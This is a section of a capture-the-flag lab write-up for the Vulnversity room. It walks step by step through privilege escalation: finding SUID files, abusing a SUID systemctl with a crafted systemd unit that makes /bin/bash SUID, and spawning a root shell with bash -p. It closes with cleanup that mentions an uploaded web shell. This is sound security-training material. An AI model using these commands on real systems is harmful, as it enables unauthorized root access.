# 05 — Privilege escalation

> This section is for the authorized Vulnversity lab target only.

## Find SUID files

Run from the remote shell as `www-data`:

```sh
find / -user root -perm -4000 -type f 2>/dev/null
```

This searches for regular files owned by root with the SUID bit. `2>/dev/null` hides permission errors. The unusual result in this room is:

```text
/bin/systemctl
```

## Create the systemd unit

The following method was verified by the supplied screenshot. Run each line separately and wait for the remote prompt before entering the next command; pasting multiple commands into a raw netcat shell previously joined some lines.

Create the unit file in `/tmp`:

```sh
printf '[Unit]\nDescription=Vulnversity lab service\n[Service]\nType=oneshot\nExecStart=/bin/chmod u+s /bin/bash\n[Install]\nWantedBy=multi-user.target\n' > /tmp/vulnversity.service
```

Check the file:

```sh
cat /tmp/vulnversity.service
```

It should include `ExecStart=/bin/chmod u+s /bin/bash` and the `[Install]` section.

Link and start the service:

```sh
/bin/systemctl link /tmp/vulnversity.service
/bin/systemctl enable --now vulnversity.service
```

`link` makes the custom unit visible to systemd. `enable --now` enables it and starts it immediately. The unit's command sets the SUID bit on Bash.

## Verify and use the privileged Bash

```sh
ls -l /bin/bash
```

Look for `s` in the permission string, e.g. `-rwsr-xr-x`. Only then run:

```sh
/bin/bash -p
id
```

The `-p` option preserves Bash's elevated effective UID. Confirm `euid=0(root)` in the `id` output; the prompt text may still say `www-data`.

Read the root flag using the absolute path:

```sh
cat /root/root.txt
```

The supplied screenshot currently proves the SUID permission change. Add a separate screenshot showing `euid=0(root)` after completing the final commands. Do not publish the flag value.

## Cleanup after recording the flags

Optional, from the elevated Bash session:

```sh
/bin/systemctl disable --now vulnversity.service 2>/dev/null || true
rm -f /etc/systemd/system/vulnversity.service
rm -f /etc/systemd/system/multi-user.target.wants/vulnversity.service
rm -f /tmp/vulnversity.service
chmod -s /bin/bash
/bin/systemctl daemon-reload
rm -f /var/www/html/internal/uploads/shell.phtml
```
